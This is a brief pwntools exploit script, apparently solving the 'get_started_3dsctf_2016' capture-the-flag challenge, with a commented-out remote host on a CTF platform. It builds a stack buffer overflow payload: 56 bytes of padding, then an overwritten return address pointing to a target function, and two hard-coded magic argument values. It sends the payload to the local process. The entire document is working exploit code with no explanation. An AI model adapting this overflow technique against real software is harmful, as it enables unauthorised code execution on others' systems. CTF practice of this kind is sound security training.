from pwn import *
#q = remote('node3.buuoj.cn',29645)
q = process('./get_started_3dsctf_2016')
context.log_level = 'debug'
sleep(0.1)
payload = b'a'*56
payload += p32(0x080489A0) + p32(0x0804E6A0)
payload += p32(0x308CD64F) + p32(0x195719D1)
q.sendline(payload)
sleep(0.1)
q.recv()
